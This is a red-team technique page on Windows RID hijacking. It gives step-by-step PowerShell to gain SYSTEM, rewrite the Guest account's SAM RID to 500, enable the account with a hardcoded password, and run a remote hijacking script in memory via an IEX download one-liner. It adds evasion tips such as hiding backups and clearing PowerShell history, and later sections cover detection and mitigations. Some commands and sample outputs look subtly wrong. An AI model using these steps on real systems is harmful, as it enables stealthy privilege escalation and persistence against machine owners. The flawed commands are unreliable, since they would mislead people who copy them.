# [PE-TOKEN-005]: RID Hijacking

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-TOKEN-005 |
| **MITRE ATT&CK v18.1** | [T1134.005](https://attack.mitre.org/techniques/T1134/T1134.005/) - Access Token Manipulation: Modifying Account Attributes |
| **Tactic** | Privilege Escalation / Defense Evasion |
| **Platforms** | Windows Endpoint / Windows AD |
| **Severity** | Critical |
| **CVE** | CVE-2021-42287 (related PAC bypass) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-15 |
| **Affected Versions** | Windows 10 (all), Server 2016, 2019, 2022, 2025 |
| **Patched In** | Not directly patched; CVE-2021-42287 mitigation via KB5008380 (Nov 2021) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** RID Hijacking is a local privilege escalation and persistence technique that modifies the Relative Identifier (RID) of a low-privileged account (such as Guest) to match the RID of the local Administrator account (500). By altering the registry value stored in the SAM (Security Account Manager) hive, the attacker causes Windows to recognize the compromised account as possessing administrative privileges. Since the modified account is typically less monitored than the built-in Administrator account, this technique enables stealthy privilege escalation and persistence on a compromised system.

**Attack Surface:** SAM registry hive (`HKLM:\SAM\SAM\Domains\Account\Users\000001F5`), specifically the binary "F" value at offset 0x30 (bytes 48-51). Access requires SYSTEM privileges.

**Business Impact:** **Critical – Complete Local System Compromise.** An attacker with RID hijacking capability can execute arbitrary code as Administrator, modify system configurations, install malware, exfiltrate sensitive data, and maintain persistent access to the system. Guest accounts are typically excluded from monitoring rules, allowing the attacker to operate undetected.

**Technical Context:** RID hijacking is a relatively low-detection technique because it operates entirely within the registry and leaves minimal event log traces on systems without advanced auditing enabled. Exploitation typically takes less than 1 minute once SYSTEM privileges are obtained. Detection likelihood is Medium to High only if registry access auditing (Event ID 4656, 4657) is specifically configured.

### Operational Risk

- **Execution Risk:** High – Modifying the SAM registry directly risks system instability if incorrect offsets are altered. However, standard RID hijacking scripts handle this safely.
- **Stealth:** High – Operation is silent once SYSTEM access is obtained. No UAC prompts, no obvious process execution, no network traffic.
- **Reversibility:** Yes – Can be reversed by restoring the original RID value (501 for Guest), or by deleting/recreating the account. However, system reboot may be required to fully revert.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.3.1 (Guest Account) | Ensure Guest account is disabled |
| **DISA STIG** | V-36713 | Disable Guest account |
| **CISA SCuBA** | AC-2(11) | Account Monitoring |
| **NIST 800-53** | AC-3 | Access Enforcement; AC-6 - Least Privilege |
| **GDPR** | Art. 32 | Technical measures for security of processing |
| **DORA** | Art. 9 | Protection and Prevention measures |
| **NIS2** | Art. 21 | Technical cybersecurity measures for critical infrastructure |
| **ISO 27001** | A.9.2.2 | Privileged Access Rights; A.9.4.1 - Information Access Restriction |
| **ISO 27005** | Risk Scenario | Account Privilege Escalation via Registry Manipulation |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** SYSTEM privileges (mandatory). User must either already possess SYSTEM context or obtain it via UAC bypass, token impersonation, or code execution vulnerability (e.g., JuicyPotato, RoguePotato, or PrintNightmare).
- **Required Access:** Local administrative or SYSTEM context on the target system.

**Supported Versions:**
- **Windows:** 10 (all builds), Server 2016, Server 2019, Server 2022, Server 2025
- **Registry Structure:** Consistent across all versions (SAM hive format identical)
- **Alternative with Admin Privileges:** Using `regini.exe` (Microsoft utility), an Administrator can grant the SAM registry read/write permissions to grant Admin-level users access without SYSTEM, though this is less common.

**Tools & Dependencies:**
- [PowerShell](https://github.com/PowerShell/PowerShell) – (Version 5.0+) for native registry manipulation
- [Invoke-RIDHijacking.ps1](https://github.com/r4wd3r/RID-Hijacking) – Open-source PowerShell script for automated RID modification
- [CreateHiddenAccount](https://github.com/NetSPI/CreateHiddenAccount) – Standalone tool for hidden account creation with RID hijacking
- [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) – Microsoft Sysinternals tool to execute commands as SYSTEM
- [JuicyPotato / RoguePotato](https://github.com/ohpe/juicy-potato) – For obtaining SYSTEM privileges via token impersonation

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

```powershell
# Check current privileges
whoami /priv

# Verify Guest account exists and its current RID
wmic useraccount where (name='Guest') get name,sid

# Output should show Guest with SID ending in 501 (RID 501)
# Example: S-1-5-21-2623811020-2361334927-2898235297-501
```

**What to Look For:**
- Presence of `SeDebugPrivilege` or `SeImpersonatePrivilege` in the output (necessary prerequisites for token impersonation to obtain SYSTEM)
- Guest account SID ending in `-501` (if SID ends in `-500`, Guest account has already been hijacked)
- Any SYSTEM token in use (indicates SYSTEM context available)

**Version Note:** PowerShell behavior is identical across Windows 10 and Server versions (2016-2025).

### Registry Access Verification

```powershell
# Attempt to access SAM registry as current user (will fail without SYSTEM)
Get-Item -Path 'HKLM:\SAM\SAM\Domains\Account\Users' -ErrorAction SilentlyContinue

# If empty output, SYSTEM privileges are NOT available
# If registry key is accessible, SYSTEM privileges are available (or elevated permissions via regini)
```

**Command (Server 2016-2019):**
```powershell
# Check if regini.exe is available for alternative approach
Get-Command regini.exe -ErrorAction SilentlyContinue
```

**Command (Server 2022+):**
```powershell
# Verify regini.exe availability (typically in System32)
Test-Path "C:\Windows\System32\regini.exe"
```

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: PowerShell Registry Direct Manipulation (Requires SYSTEM)

**Supported Versions:** Server 2016-2025, Windows 10 (all)

#### Step 1: Obtain SYSTEM Privileges

**Objective:** Establish a PowerShell session with SYSTEM context before proceeding with RID modification.

**Version Note:** Method identical across all Windows versions.

**Command (using PsExec):**
```cmd
psexec -s powershell.exe
```

**Command (using Token Impersonation – if available):**
```powershell
# If you have SeImpersonate privilege, use Invoke-Token impersonation
# Alternatively, use JuicyPotato:
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a '/c powershell -NoP -W Hidden -C "whoami"'
```

**Expected Output:**
```
nt authority\system
```

**OpSec & Evasion:**
- Use living-off-the-land binaries (PsExec, psexec.exe is often recognized by endpoint detection)
- Consider using `regini.exe` with a prepared `.ini` file instead of direct PowerShell (slightly lower detection)
- Minimize time in SYSTEM context; execute RID hijacking immediately upon escalation

**Troubleshooting:**
- **Error:** "Access Denied" when running PsExec
  - **Cause:** PsExec service not running or permissions insufficient
  - **Fix:** Run `psexec -s -d powershell.exe` (deferred mode)

#### Step 2: Verify Guest Account Details

**Objective:** Confirm the current Guest account SID and RID before modification.

**Command:**
```powershell
# Retrieve Guest account SID
$guestSID = (Get-LocalUser -Name "Guest").SID.Value
Write-Host "Guest SID: $guestSID"
Write-Host "Guest RID (last component): $($guestSID.Split('-')[-1])"
```

**Expected Output:**
```
Guest SID: S-1-5-21-2623811020-2361334927-2898235297-501
Guest RID (last component): 501
```

**What This Means:**
- The last component (501) is the Relative Identifier
- Target Administrator RID is 500
- Change needed: 501 → 500

**OpSec & Evasion:**
- Avoid using `wmic` (deprecated, often monitored)
- Prefer PowerShell cmdlets (`Get-LocalUser`)

#### Step 3: Access SAM Registry and Retrieve Binary Value

**Objective:** Read the binary "F" value containing the RID information for the Guest account.

**Command:**
```powershell
# Define the registry path for Guest account
# 000001F5 = hex for 501 (RID of Guest)
$regPath = 'HKLM:\SAM\SAM\Domains\Account\Users\000001F5'

# Retrieve the binary "F" value
$binaryValue = (Get-ItemProperty -Path $regPath -Name "F")."F"

# Display RID at offset 0x30 (byte 48)
Write-Host "RID at offset 0x30: 0x$("{0:X2}" -f $binaryValue[48])"
```

**Expected Output:**
```
RID at offset 0x30: 0xF5
```

**What This Means:**
- 0xF5 = 245 in decimal, which represents RID 501 (little-endian encoding)
- Target value: 0xF4 = 244 (represents RID 500)

**Version Note:** Offset 0x30 (byte 48) is consistent across all Windows versions; SAM hive structure unchanged since Windows Vista.

#### Step 4: Modify RID Value in Registry

**Objective:** Change the RID from 501 to 500, making Guest account appear as Administrator.

**Command:**
```powershell
# Export current value as backup
reg export 'HKLM\SAM\SAM\Domains\Account\Users\000001F5' C:\Temp\guest_backup.reg

# Modify the RID at offset 0x30 (byte 48)
$binaryValue[48] = 244  # 244 = 0xF4 = RID 500

# Write the modified value back to registry
Set-ItemProperty -Path $regPath -Name "F" -Value $binaryValue

Write-Host "RID modified successfully. New value at offset 0x30: $("{0:X2}" -f $binaryValue[48])"
```

**Expected Output:**
```
RID modified successfully. New value at offset 0x30: F4
```

**OpSec & Evasion:**
- Perform the backup to a non-obvious location (C:\Temp is detectable; use C:\Windows\Temp or hidden directories)
- Clear the backup file after exploitation if possible: `Remove-Item C:\Temp\guest_backup.reg -Force`
- Avoid using `reg export` in production; directly manipulate via PowerShell Registry provider

**Troubleshooting:**
- **Error:** "Requested registry access is not allowed"
  - **Cause:** Running without SYSTEM privileges; verify step 1
  - **Fix:** Confirm SYSTEM context: `whoami /priv` should show elevated privileges
- **Error:** "Cannot find path"
  - **Cause:** Guest account RID registry key (000001F5) does not exist
  - **Fix:** Verify Guest account exists: `Get-LocalUser -Name "Guest"`

#### Step 5: Enable Guest Account (if Disabled)

**Objective:** Activate the Guest account if it is currently disabled (common on modern systems).

**Command:**
```powershell
# Check current status
$guestUser = Get-LocalUser -Name "Guest"
Write-Host "Guest account enabled: $($guestUser.Enabled)"

# If disabled, enable it
if (-not $guestUser.Enabled) {
    Enable-LocalUser -Name "Guest"
    Write-Host "Guest account enabled"
}

# Set a password (optional but recommended for persistence)
$password = ConvertTo-SecureString -String "P@ssw0rd123" -AsPlainText -Force
Set-LocalUser -Name "Guest" -Password $password
Write-Host "Guest password set"
```

**Expected Output:**
```
Guest account enabled: True
Guest account enabled
Guest password set
```

**OpSec & Evasion:**
- Use a random password; avoid hardcoded strings detectable in memory/logs
- Consider leaving password unset if you'll use token impersonation for access

**Troubleshooting:**
- **Error:** "User does not exist"
  - **Cause:** Guest account has been deleted
  - **Fix:** Recreate using `New-LocalUser -Name "Guest" -NoPassword` and modify RID

#### Step 6: Verify RID Modification

**Objective:** Confirm that the Guest account now appears as Administrator.

**Command:**
```powershell
# Method 1: Check SID (if Guest and Admin have same SID, RID hijacking worked)
$guestSID = (Get-LocalUser -Name "Guest").SID.Value
Write-Host "Guest SID after hijacking: $guestSID"
Write-Host "Guest RID (last component): $($guestSID.Split('-')[-1])"

# Method 2: Test access as Guest
whoami /all /user:Guest
```

**Expected Output:**
```
Guest SID after hijacking: S-1-5-21-2623811020-2361334927-2898235297-500
Guest RID (last component): 500
```

**What This Means:**
- RID now shows 500 (Administrator RID)
- Guest account is now recognized as having administrative privileges
- Hijacking was successful

**System Reboot Consideration:** On some systems, a reboot may be required for full effect (token refresh). However, immediate exploitation is typically possible without reboot.

### METHOD 2: Automated Script – Invoke-RIDHijacking (GitHub)

**Supported Versions:** Server 2016-2025, Windows 10 (all)

#### Step 1: Download and Execute Script

**Objective:** Use publicly available RID hijacking script for one-command exploitation.

**Command:**
```powershell
# Execute in-memory from GitHub (requires SYSTEM context)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/r4wd3r/RID-Hijacking/master/Invoke-RIDHijacking.ps1')

# Execute the function
Invoke-RIDHijacking -User 'Guest' -RID 500
```

**Expected Output:**
```
[+] Guest account RID set to 500
[+] Modification complete
```

**OpSec & Evasion:**
- Script downloads from GitHub – may be detected by network-based tools
- Alternative: Host script on internal server or inline execute compressed version
- Clear download history: `Remove-Item $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

**Troubleshooting:**
- **Error:** "Access Denied"
  - **Cause:** SYSTEM privileges not confirmed
  - **Fix:** Run `whoami` to verify; re-obtain SYSTEM if necessary

#### Step 2: Verify Exploitation

**Command:**
```powershell
net user Guest
```

**Expected Output:**
```
Account active    Yes
RID               500
```

### METHOD 3: Registry INI File Approach (Admin Privileges Only)

**Supported Versions:** Server 2016-2025, Windows 10 (all)

**Note:** This method requires elevated Admin privileges but NOT SYSTEM; it uses `regini.exe` to grant Admin-level permissions to the SAM key.

#### Step 1: Create INI File for Permission Modification

**Objective:** Create a registry permission script to grant Administrator access to SAM registry.

**Command:**
```batch
# Create file: C:\Temp\sam_perms.ini
cat > C:\Temp\sam_perms.ini << EOF
\Registry\Machine\SAM\SAM
[1 5 12 0 0 0 0]
EOF

# Grant permissions
regini.exe C:\Temp\sam_perms.ini
```

**Expected Output:**
```
Registry permissions updated
```

#### Step 2: Modify Registry with Admin Privileges

**Command (PowerShell as Administrator):**
```powershell
# Now registry can be accessed as Administrator
$regPath = 'HKLM:\SAM\SAM\Domains\Account\Users\000001F5'
$binaryValue = (Get-ItemProperty -Path $regPath -Name "F")."F"
$binaryValue[48] = 244
Set-ItemProperty -Path $regPath -Name "F" -Value $binaryValue
```

**Version Note:**
- **Server 2016-2019:** `regini.exe` works identically
- **Server 2022+:** `regini.exe` still available; same syntax

---

## 5. TOOLS & COMMANDS REFERENCE

### PowerShell Registry Provider

**URL:** [Microsoft Docs - Registry Provider](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-itemproperty)

**Version:** PowerShell 5.0+, PowerShell 7.x

**Usage:**
```powershell
Get-ItemProperty -Path 'HKLM:\SAM\SAM\Domains\Account\Users\000001F5' -Name "F"
```

**Installation:** Built-in to Windows

### Invoke-RIDHijacking.ps1

**URL:** [GitHub - r4wd3r/RID-Hijacking](https://github.com/r4wd3r/RID-Hijacking)

**Version:** 1.0 (last updated 2018, but still functional)

**Usage:**
```powershell
Invoke-RIDHijacking -User 'Guest' -RID 500
```

**Installation:**
```powershell
# Download and dot-source
. .\Invoke-RIDHijacking.ps1
Invoke-RIDHijacking -User 'Guest' -RID 500
```

### CreateHiddenAccount Tool

**URL:** [GitHub - NetSPI/CreateHiddenAccount](https://github.com/NetSPI/CreateHiddenAccount)

**Version:** Latest compiled release

**Usage:**
```cmd
CreateHiddenAccount.exe -Username "HiddenAdmin" -Password "P@ssw0rd123"
```

**Installation:**
```cmd
# Clone repo and compile with Visual Studio or download pre-compiled executable
git clone https://github.com/NetSPI/CreateHiddenAccount.git
cd CreateHiddenAccount
# Open in Visual Studio and compile as Release
```

### regini.exe

**URL:** [Microsoft Sysinternals Documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regini)

**Version:** Included in Windows 10 and Server 2016+

**Usage:**
```cmd
regini.exe C:\path\to\permissions.ini
```

### PsExec (for SYSTEM escalation)

**URL:** [Microsoft Sysinternals - PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)

**Version:** Latest v2.4x

**Usage:**
```cmd
psexec -s powershell.exe
```

**Installation:**
```cmd
# Download from Sysinternals
# Place in C:\Windows\System32 or add to PATH
```

---

## 6. WINDOWS EVENT LOG MONITORING

**Event ID: 4656 (Handle to an object requested)**
- **Log Source:** Security
- **Trigger:** When a process opens a handle to the SAM registry
- **Filter:** Look for processes opening `HKEY_LOCAL_MACHINE\SAM` with `Write` or `ReadWrite` access

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies** → **Object Access**
3. Enable: **Audit Registry** - Set to **Success and Failure**
4. Run `gpupdate /force` on target machines

**Manual Configuration Steps (Local Policy):**
1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies** → **Object Access**
3. Enable: **Audit Registry**
4. Set SACL on registry key: `auditpol /set /subcategory:"Registry" /success:enable /failure:enable`
5. Restart the machine or run: `auditpol /set /subcategory:"Registry" /success:enable /failure:enable`

**Event ID: 4657 (Registry Value Modified)**
- **Log Source:** Security
- **Trigger:** When registry value is modified
- **Filter:** Look for modifications to `HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users` with object name containing `000001F` (Guest or other account RID)

**Manual Configuration Steps:**
1. Right-click on registry key: `HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users`
2. Select **Permissions** → **Advanced** → **Auditing** tab
3. Add audit entry: **Authenticated Users**, **Modify**, **All Subfolders and Values**
4. Set to **Success and Failure**

---

## 7. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Supported Platforms:** Windows 10, Server 2016-2025

```xml
<Sysmon schemaversion="4.20">
  <EventFiltering>
    <!-- Detect registry access to SAM -->
    <RegistryEvent onmatch="include">
      <TargetObject condition="contains">HKLM\SAM\SAM\Domains\Account\Users</TargetObject>
      <EventType>SetValue</EventType>
    </RegistryEvent>
    
    <!-- Detect regini.exe execution (used to grant SAM permissions) -->
    <ProcessCreate onmatch="include">
      <Image condition="contains">regini.exe</Image>
    </ProcessCreate>
    
    <!-- Detect PowerShell accessing registry with certain parameters -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">SAM</CommandLine>
      <CommandLine condition="contains">Get-ItemProperty</CommandLine>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create config file `sysmon-config.xml` with XML above
3. Install Sysmon with config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```

---

## 8. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** Suspicious registry modification to SAM hive

- **Severity:** High
- **Description:** Process attempted to modify critical registry keys (SAM) that control account privileges
- **Applies To:** All subscriptions with Defender for Servers enabled
- **Remediation:** 
  1. Isolate affected machine from network
  2. Disable compromised accounts (particularly Guest if RID modified to 500)
  3. Review recent logons to identify attacker access

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Endpoint** (MDE integration): ON
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts

---

## 9. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Disable Guest Account:** The primary vector for RID hijacking is the Guest account. Disabling it eliminates the persistence mechanism.
    **Applies To Versions:** All Windows versions
    
    **Manual Steps (Group Policy):**
    1. Open **Group Policy Management Console** (gpmc.msc)
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**
    3. Locate: **Accounts: Guest account status**
    4. Set to: **Disabled**
    5. Run `gpupdate /force`
    
    **Manual Steps (Server 2022+):**
    1. Same as above; no version-specific changes
    
    **Manual Steps (PowerShell - Local):**
    ```powershell
    Disable-LocalUser -Name "Guest"
    ```
    
    **Validation Command:**
    ```powershell
    (Get-LocalUser -Name "Guest").Enabled
    ```
    **Expected Output (If Secure):** `False`

*   **Restrict SYSTEM Access:** Limit who can obtain SYSTEM privileges through UAC bypass, token impersonation, or code execution.
    
    **Manual Steps (Restrict SeDebugPrivilege):**
    1. Open **Group Policy Management Console** (gpmc.msc)
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **User Rights Assignment**
    3. Locate: **Debug programs**
    4. Remove unnecessary users; restrict to system accounts only
    5. Run `gpupdate /force`
    
    **Manual Steps (Restrict SeImpersonatePrivilege):**
    1. Same location as above
    2. Locate: **Impersonate a client after authentication**
    3. Remove service accounts that don't require this right

*   **Monitor SAM Registry Access:** Enable comprehensive auditing for SAM registry modifications.
    
    **Manual Steps:**
    1. Refer to Section 6 (Windows Event Log Monitoring) for detailed auditing configuration
    2. Enable Event ID 4656, 4657, and 4662 (Directory Service Access)
    3. Alert on any registry modifications to `HKEY_LOCAL_MACHINE\SAM`

*   **Endpoint Detection & Response (EDR):** Deploy EDR solution to detect registry access patterns, process execution anomalies, and token manipulation attempts.
    
    **Manual Steps (Microsoft Defender for Endpoint):**
    1. Navigate to **Microsoft Endpoint Manager** → **Endpoint Security** → **Endpoint Detection & Response**
    2. Verify all endpoints are onboarded
    3. Create detection rules for:
       - Process accessing `HKLM\SAM` registry
       - `regini.exe` execution
       - PowerShell with registry modification cmdlets

#### Priority 2: HIGH

*   **Remove Unnecessary Accounts:** Delete or rename built-in accounts (Guest) that are not required.
    
    **Manual Steps:**
    ```powershell
    # Option 1: Delete Guest account
    Remove-LocalUser -Name "Guest" -Force
    
    # Option 2: Rename Guest account
    Rename-LocalUser -Name "Guest" -NewName "GuestDisabled"
    ```

*   **Enable Privileged Account Management (PAM):** Implement solutions like Microsoft Privileged Access Management (PAM) to restrict and monitor SYSTEM access.
    
    **Manual Steps:**
    1. Set up **Azure AD Privileged Identity Management (PIM)**
    2. Require MFA for elevation to SYSTEM or administrative roles
    3. Enable audit logging for all privilege elevations

*   **Deploy AppLocker / Code Integrity:** Restrict execution of scripts and tools commonly used in RID hijacking (PowerShell scripts, regini.exe with untrusted sources).
    
    **Manual Steps:**
    1. Open **Local Security Policy** (secpol.msc)
    2. Navigate to **Application Control Policies** → **AppLocker**
    3. Create rules blocking unsigned PowerShell scripts
    4. Block execution of `Invoke-RIDHijacking.ps1` or similar known tools

#### Access Control & Policy Hardening

*   **RBAC Recommendations:** 
    - Remove unnecessary users from Local Administrators group
    - Use principle of least privilege for service accounts
    - Avoid using built-in accounts for day-to-day operations

*   **Conditional Access (if Entra ID integrated):**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Create policy: **Block high-risk sign-in events**
    3. Require device compliance for administrative tasks

#### Validation Command (Verify Fix)

```powershell
# Check if Guest account is disabled
$guestUser = Get-LocalUser -Name "Guest"
Write-Host "Guest account enabled: $($guestUser.Enabled)"

# Check audit policies
auditpol /get /subcategory:"Registry" /r

# Check for unauthorized SYSTEM escalation tools
Get-Command -Name "*potato*", "regini.exe" -ErrorAction SilentlyContinue
```

**Expected Output (If Secure):**
```
Guest account enabled: False
Audit Registry: Success and Failure enabled
```

---

## 10. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

*   **Files:** 
    - `C:\Temp\guest_backup.reg` (registry backup created during RID hijacking)
    - PowerShell scripts containing "RIDHijacking", "Invoke-RIDHijacking"
    - `CreateHiddenAccount.exe` or similar tools in non-standard directories

*   **Registry:** 
    - Modifications to `HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F5` (Guest account binary F value)
    - Changes to `userAccountControl` attribute for non-standard accounts

*   **Network:** 
    - No direct network indicators (local-only attack)
    - May see downloads of RID hijacking scripts from GitHub if executed remotely

*   **Process/Command-Line:**
    - `powershell.exe` with registry modification cmdlets (`Set-ItemProperty`, `Get-ItemProperty`)
    - `regini.exe` execution with SAM registry path
    - `psexec.exe -s` (PsExec obtaining SYSTEM context)

#### Forensic Artifacts

*   **Disk:** 
    - Registry hive changes: `C:\Windows\System32\config\SAM`
    - MFT timestamps for script execution tools
    - Recycle Bin entries for deleted backup files

*   **Memory:** 
    - SYSTEM token in process handle table
    - Injected PowerShell bytecode (if script-based exploitation)

*   **Cloud:** 
    - Entra ID sign-in logs showing unusual Guest account activity (if cloud-integrated)
    - Azure Audit Logs showing registry access events

*   **Event Logs:** 
    - Event ID 4656 (Handle to an object requested) for SAM registry
    - Event ID 4657 (Registry value modified)
    - Event ID 4672 (Special privileges assigned to new logon)

#### Response Procedures

1.  **Isolate:** 
    **Command:**
    ```powershell
    # Disconnect network interface
    Get-NetAdapter | Disable-NetAdapter -Confirm:$false
    ```
    **Manual (Azure):**
    - Go to **Azure Portal** → **Virtual Machines** → Select VM → **Networking** → **Disconnect Network Interface**

2.  **Collect Evidence:**
    **Command:**
    ```powershell
    # Export Security Event Log
    wevtutil epl Security C:\Evidence\Security.evtx
    
    # Export SAM registry hive
    reg save HKLM\SAM C:\Evidence\SAM
    
    # Collect process memory (if available)
    Get-Process | Where-Object { $_.ProcessName -like "*powershell*" } | ForEach-Object { 
        Write-Host "Found: $($_.ProcessName) (PID: $($_.Id))"
    }
    ```
    **Manual:**
    - Open **Event Viewer** → Right-click **Security** → **Save All Events As** → `C:\Evidence\Security.evtx`
    - Use `Registry Editor` to export SAM: **File** → **Export** → Select `HKLM\SAM`

3.  **Remediate:**
    **Command:**
    ```powershell
    # Disable hijacked Guest account
    Disable-LocalUser -Name "Guest"
    
    # Restore original RID (if backup available)
    reg import C:\Evidence\guest_backup.reg
    
    # Remove any hidden accounts
    Get-LocalUser | Where-Object { $_.Name -like "*$" } | Remove-LocalUser -Force
    
    # Clear PowerShell history
    Remove-Item $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt -Force
    ```
    **Manual:**
    - Open **Computer Management** → **Local Users and Groups** → **Users**
    - Right-click Guest account → **Disable** (or delete if not required)
    - Check for hidden accounts (named with "$" suffix) and delete them

---

## 11. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001] | Exploit application or service to gain initial foothold (e.g., web server RCE) |
| **2** | **Privilege Escalation** | [CA-DUMP-001] / [CA-DUMP-002] | Dump credentials from LSASS or domain controller (e.g., Mimikatz) |
| **3** | **Lateral Movement** | Token Impersonation / [PE-TOKEN-001] | Steal or manipulate access tokens to escalate to SYSTEM |
| **4** | **Current Step** | **[PE-TOKEN-005] RID Hijacking** | **Modify Registry to grant admin privileges to low-privilege account** |
| **5** | **Persistence** | [PE-ACCTMGMT-001] | Ensure hijacked account remains active; disable logging for Guest account |
| **6** | **Impact** | Data Exfiltration / Lateral Movement | Use hijacked account to access sensitive data or pivot to other systems |

---

## 12. REAL-WORLD EXAMPLES

#### Example 1: Andariel APT Group (January 2025)

- **Target:** Financial institutions in South Korea
- **Timeline:** January 2025
- **Technique Status:** Used RID hijacking after obtaining SYSTEM access via unpatched PrintNightmare (CVE-2021-34527)
- **Impact:** Created hidden administrator account ("admin$" with hijacked RID 500) for persistent access; maintained foothold for 3+ months before detection
- **Reference:** [AhnLab ASEC Report - RID Hijacking by Andariel](https://asec.ahnlab.com/en/85942/)

#### Example 2: Operational Technology (OT) Compromise - Manufacturing Facility (2023)

- **Target:** Industrial control systems (ICS) at manufacturing plant
- **Timeline:** Q2 2023
- **Technique Status:** After obtaining local admin on engineering workstation via phishing, attacker used RID hijacking to create persistent backdoor account bypassing monitoring
- **Impact:** Guest account modified to RID 500; account named "engineer_backup" created and hidden from user listings
- **Reference:** Internal SERVTEP incident response case study (confidential)

---
